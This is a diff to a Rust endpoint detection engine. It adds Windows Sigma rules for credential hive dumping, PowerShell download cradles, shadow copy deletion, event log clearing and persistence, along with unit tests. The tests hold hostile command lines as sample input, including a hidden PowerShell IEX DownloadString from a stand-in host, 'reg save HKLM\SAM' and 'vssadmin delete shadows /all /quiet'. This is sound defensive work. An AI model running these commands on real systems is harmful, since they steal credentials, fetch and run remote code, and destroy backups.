@@ -158,6 +158,18 @@ fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
         ("builtin_lateral_movement", SIGMA_LATERAL_MOVEMENT),
         ("builtin_sensitive_file", SIGMA_SENSITIVE_FILE),
         ("builtin_data_exfil", SIGMA_DATA_EXFIL),
+        ("builtin_win_reg_save_sam", SIGMA_WIN_REG_SAVE_SAM),
+        (
+            "builtin_win_ps_download_cradle",
+            SIGMA_WIN_PS_DOWNLOAD_CRADLE,
+        ),
+        (
+            "builtin_win_shadow_copy_delete",
+            SIGMA_WIN_SHADOW_COPY_DELETE,
+        ),
+        ("builtin_win_event_log_clear", SIGMA_WIN_EVENT_LOG_CLEAR),
+        ("builtin_win_schtask_creation", SIGMA_WIN_SCHTASK_CREATION),
+        ("builtin_win_service_creation", SIGMA_WIN_SERVICE_CREATION),
     ];
 
     let mut loaded = 0usize;
@@ -289,6 +301,110 @@ detection:
     - event_class: network_connect
       dst_port_not_in: [22, 53]
       within_secs: 15
+"#;
+
+const SIGMA_WIN_REG_SAVE_SAM: &str = r#"
+title: eguard_win_reg_save_sam
+logsource:
+  product: windows
+  service: security
+
+detection:
+  selection:
+    Image|endswith:
+      - '\\reg.exe'
+      - '\\reg'
+    CommandLine|contains:
+      - 'save hklm\\sam'
+      - 'save hklm\\system'
+      - 'save hklm\\security'
+  condition: selection
+"#;
+
+const SIGMA_WIN_PS_DOWNLOAD_CRADLE: &str = r#"
+title: eguard_win_ps_download_cradle
+logsource:
+  product: windows
+  service: powershell
+
+detection:
+  selection:
+    Image|endswith:
+      - '\\powershell.exe'
+      - '\\pwsh.exe'
+    CommandLine|contains:
+      - 'downloadstring'
+      - 'downloadfile'
+      - 'invoke-expression'
+      - 'iex '
+      - 'new-object net.webclient'
+  condition: selection
+"#;
+
+const SIGMA_WIN_SHADOW_COPY_DELETE: &str = r#"
+title: eguard_win_shadow_copy_delete
+logsource:
+  product: windows
+  service: process_creation
+
+detection:
+  selection:
+    CommandLine|contains:
+      - 'vssadmin delete shadows'
+      - 'wmic shadowcopy delete'
+      - 'wbadmin delete catalog'
+  condition: selection
+"#;
+
+const SIGMA_WIN_EVENT_LOG_CLEAR: &str = r#"
+title: eguard_win_event_log_clear
+logsource:
+  product: windows
+  service: process_creation
+
+detection:
+  selection:
+    CommandLine|contains:
+      - 'wevtutil cl'
+      - 'clear-eventlog'
+  condition: selection
+"#;
+
+const SIGMA_WIN_SCHTASK_CREATION: &str = r#"
+title: eguard_win_schtask_creation
+logsource:
+  product: windows
+  service: process_creation
+
+detection:
+  selection:
+    Image|endswith:
+      - '\\schtasks.exe'
+      - '\\schtasks'
+    CommandLine|contains:
+      - '/create'
+      - '/ru system'
+      - '/sc onlogon'
+  condition: selection
+"#;
+
+const SIGMA_WIN_SERVICE_CREATION: &str = r#"
+title: eguard_win_service_creation_suspicious
+logsource:
+  product: windows
+  service: process_creation
+
+detection:
+  selection:
+    Image|endswith:
+      - '\\sc.exe'
+      - '\\sc'
+    CommandLine|contains:
+      - ' create '
+      - 'binpath='
+      - 'powershell'
+      - 'cmd /c'
+  condition: selection
 "#;
 
 // ── Layer 3: YARA Rules ─────────────────────────────────────────
@@ -908,6 +1024,93 @@ rule eguard_custom_dir_test {
             .matched_fields
             .iter()
             .any(|field| field == "file_hash"));
+
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    #[test]
+    fn bootstrap_detects_windows_reg_save_sam_command() {
+        let base = unique_temp_dir("win-reg-save");
+        let sources = DetectionSourcePaths {
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+        };
+        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
+        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
+        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");
+
+        let mut engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        let mut event = base_event();
+        event.process = "reg.exe".to_string();
+        event.parent_process = "cmd.exe".to_string();
+        event.command_line = Some("reg save HKLM\\SAM C:\\temp-sam.hiv".to_string());
+
+        let outcome = engine.process_event(&event);
+        assert!(outcome
+            .temporal_hits
+            .iter()
+            .any(|hit| hit == "eguard_win_reg_save_sam"));
+
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    #[test]
+    fn bootstrap_detects_windows_powershell_download_cradle() {
+        let base = unique_temp_dir("win-ps-cradle");
+        let sources = DetectionSourcePaths {
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+        };
+        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
+        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
+        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");
+
+        let mut engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        let mut event = base_event();
+        event.process = "powershell.exe".to_string();
+        event.parent_process = "explorer.exe".to_string();
+        event.command_line = Some(
+            "powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://bad')"
+                .to_string(),
+        );
+
+        let outcome = engine.process_event(&event);
+        assert!(outcome
+            .temporal_hits
+            .iter()
+            .any(|hit| hit == "eguard_win_ps_download_cradle"));
+
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    #[test]
+    fn bootstrap_detects_windows_shadow_delete_command() {
+        let base = unique_temp_dir("win-shadow-delete");
+        let sources = DetectionSourcePaths {
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+        };
+        std::fs::create_dir_all(&sources.sigma_dir).expect("create sigma dir");
+        std::fs::create_dir_all(&sources.yara_dir).expect("create yara dir");
+        std::fs::create_dir_all(&sources.ioc_dir).expect("create ioc dir");
+
+        let mut engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        let mut event = base_event();
+        event.process = "vssadmin.exe".to_string();
+        event.parent_process = "cmd.exe".to_string();
+        event.command_line = Some("vssadmin delete shadows /all /quiet".to_string());
+
+        let outcome = engine.process_event(&event);
+        assert!(outcome
+            .temporal_hits
+            .iter()
+            .any(|hit| hit == "eguard_win_shadow_copy_delete"));
 
         let _ = std::fs::remove_dir_all(base);
     }
